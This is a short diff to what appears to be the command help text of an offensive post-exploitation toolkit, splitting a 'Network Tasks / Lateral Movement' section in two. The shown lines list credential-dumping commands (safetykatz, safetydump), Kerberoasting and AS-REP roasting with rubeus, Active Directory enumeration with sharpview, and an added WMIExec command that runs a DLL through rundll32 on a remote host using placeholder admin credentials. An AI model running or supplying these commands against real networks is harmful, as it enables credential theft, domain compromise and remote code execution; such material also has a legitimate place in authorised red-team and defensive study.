@@ -106,8 +106,8 @@ safetydump <pid>
 safetykatz minidump
 safetykatz full
 
-Network Tasks / Lateral Movement:
-====================================
+Network Tasks:
+================
 rubeus kerberoast
 rubeus asreproast /user:username
 sharpview Get-NetUser -SamAccountName ben
@@ -121,6 +121,10 @@ sharpview Get-DomainUser -AdminCount -Properties samaccountname
 sharpview Get-DomainComputer -LDAPFilter operatingsystem=*2012* -Properties samaccountname
 sharpview Find-InterestingFile -Path c:\\users\\ -Include *exe*
 sharpview Find-InterestingDomainShareFile -ComputerName SERVER01
+
+Lateral Movement:
+==================
+run-exe WMIExec.Program WExec -t 10.0.0.1 -u admin -d domain -p password1 -c "rundll32 c:\\users\\public\\run.dll,etp"
 
 Socks:
 ======
